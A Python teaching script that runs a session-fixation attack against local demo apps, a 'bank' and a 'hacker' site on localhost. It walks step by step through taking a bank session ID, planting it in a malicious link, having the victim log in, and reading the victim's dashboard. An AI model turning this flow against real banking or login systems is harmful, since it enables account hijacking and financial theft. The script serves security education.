#!/usr/bin/env python3
"""
Bank Session Fixation Attack Demonstration
This demonstrates how a hacker can access a victim's bank account using session fixation.
"""

import requests
from urllib.parse import urljoin
import time

class BankSessionFixationDemo:
    def __init__(self):
        self.bank_url = "http://localhost:5001"  # Real bank
        self.hacker_url = "http://localhost:5000"  # Hacker's fake page
        self.hacker_session = requests.Session()
        self.victim_session = requests.Session()
    
    def step1_hacker_gets_session_from_bank(self):
        """Step 1: Hacker visits bank and gets a session ID."""
        print("🎯 STEP 1: Hacker visits bank and gets session ID")
        print("=" * 60)
        
        # Hacker visits the real bank
        response = self.hacker_session.get(f"{self.bank_url}/bank/login")
        
        print(f"Hacker visits: {response.url}")
        print(f"Status: {response.status_code}")
        
        # Get session cookie from bank
        session_cookies = [name for name in self.hacker_session.cookies.keys() if 'session' in name.lower()]
        if session_cookies:
            session_id = self.hacker_session.cookies[session_cookies[0]]
            print(f"🎯 Hacker captured bank session ID: {session_id}")
            return session_id
        else:
            print("❌ No session cookie found from bank")
            return None
    
    def step2_hacker_creates_malicious_link(self, bank_session_id):
        """Step 2: Hacker creates malicious link with bank session ID."""
        print(f"\n🎯 STEP 2: Hacker creates malicious link")
        print("=" * 60)
        
        malicious_url = f"{self.hacker_url}/login?session_id={bank_session_id}"
        print(f"📧 Hacker sends this malicious link to victim:")
        print(f"   {malicious_url}")
        print(f"📝 This link contains the hacker's bank session ID")
        
        return malicious_url
    
    def step3_victim_visits_malicious_link(self, malicious_url):
        """Step 3: Victim visits the malicious link."""
        print(f"\n🎯 STEP 3: Victim visits malicious link")
        print("=" * 60)
        
        # Victim visits the malicious link
        response = self.victim_session.get(malicious_url)
        
        print(f"Victim visits: {response.url}")
        print(f"Status: {response.status_code}")
        
        # Check if victim got the same session ID as hacker
        session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
        if session_cookies:
            session_id = self.victim_session.cookies[session_cookies[0]]
            print(f"🎯 Victim now has session ID: {session_id}")
            print(f"📝 This should be the same session ID the hacker captured from the bank")
            return session_id
        else:
            print("❌ No session cookie found")
            return None
    
    def step4_victim_logs_in_on_hacker_site(self, username, password):
        """Step 4: Victim logs in on hacker's fake site."""
        print(f"\n🎯 STEP 4: Victim logs in on hacker's fake site")
        print("=" * 60)
        
        login_data = {
            'username': username,
            'password': password
        }
        
        try:
            response = self.victim_session.post(
                f"{self.hacker_url}/login",
                data=login_data,
                allow_redirects=True
            )
            
            print(f"Victim logs in as: {username}")
            print(f"Status: {response.status_code}")
            print(f"Final URL: {response.url}")
            
            # Check session ID after login - it should remain the same
            session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
            if session_cookies:
                # Get all session cookies and use the first one
                all_session_cookies = [self.victim_session.cookies[cookie] for cookie in session_cookies]
                session_id = all_session_cookies[0]  # Use the first session cookie
                print(f"🎯 Session ID after login: {session_id}")
                print(f"📝 This session ID should NOT change after login (vulnerable!)")
                return session_id
            else:
                print("❌ No session cookie after login")
                return None
                
        except Exception as e:
            print(f"Error during login: {e}")
            # Try to get session ID even if there's an error
            session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
            if session_cookies:
                all_session_cookies = [self.victim_session.cookies[cookie] for cookie in session_cookies]
                session_id = all_session_cookies[0]
                print(f"🎯 Session ID after login (recovered): {session_id}")
                return session_id
            return None
    
    def step5_hacker_accesses_victim_bank_account(self, bank_session_id):
        """Step 5: Hacker uses session ID to access victim's bank account."""
        print(f"\n🎯 STEP 5: Hacker accesses victim's bank account")
        print("=" * 60)
        
        # Hacker uses the same session ID that the victim used
        # This should be the session ID from the bank that the victim unknowingly used
        response = self.hacker_session.get(f"{self.bank_url}/bank/dashboard")
        
        print(f"Hacker accesses bank dashboard: {response.url}")
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ SUCCESS: Hacker can access victim's bank account!")
            print("🚨 VULNERABILITY CONFIRMED: Session fixation attack successful!")
            
            # Extract account info from response
            if 'Account Information' in response.text:
                print("✅ Hacker can see victim's bank account information!")
                print("💰 Hacker can see victim's balance, account number, etc.")
            else:
                print("❌ Bank dashboard access failed")
        else:
            print("❌ Hacker cannot access victim's bank account")
            print("This means the session fixation attack was prevented!")
    
    def demonstrate_attack(self):
        """Demonstrate the complete bank session fixation attack."""
        print("🏦 BANK SESSION FIXATION ATTACK DEMONSTRATION")
        print("=" * 70)
        print("This demonstrates how a hacker can access a victim's bank account")
        print("by using session fixation to hijack their session.")
        print()
        
        # Step 1: Hacker gets session from bank
        bank_session_id = self.step1_hacker_gets_session_from_bank()
        if not bank_session_id:
            print("❌ Cannot proceed without bank session ID")
            return
        
        # Step 2: Hacker creates malicious link
        malicious_url = self.step2_hacker_creates_malicious_link(bank_session_id)
        
        # Step 3: Victim visits malicious link
        victim_session_id = self.step3_victim_visits_malicious_link(malicious_url)
        if not victim_session_id:
            print("❌ Victim did not get session ID")
            return
        
        # Step 4: Victim logs in on hacker's site
        login_session_id = self.step4_victim_logs_in_on_hacker_site('john', 'john123')
        if not login_session_id:
            print("❌ Login failed")
            return
        
        # Step 5: Hacker accesses victim's bank account
        self.step5_hacker_accesses_victim_bank_account(bank_session_id)
        
        # Analysis
        print(f"\n🔍 ATTACK ANALYSIS")
        print("=" * 40)
        print(f"Bank session ID (hacker's): {bank_session_id}")
        print(f"Victim session ID: {victim_session_id}")
        print(f"Session ID after login: {login_session_id}")
        
        if victim_session_id == login_session_id:
            print("🚨 VULNERABILITY: Session ID unchanged after login!")
            print("✅ Session fixation attack successful!")
            print("💰 Hacker can now access victim's bank account!")
        else:
            print("✅ SECURE: Session ID changed after login")
            print("✅ Session fixation attack prevented!")

def main():
    print("🏦 Bank Session Fixation Attack Demo")
    print("=" * 70)
    print("Make sure both apps are running:")
    print("  - Bank app: python bank_app.py (port 5001)")
    print("  - Hacker app: python vulnerable_app.py (port 5000)")
    print()
    
    demo = BankSessionFixationDemo()
    
    try:
        demo.demonstrate_attack()
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure both apps are running on the correct ports")

if __name__ == '__main__':
    main() 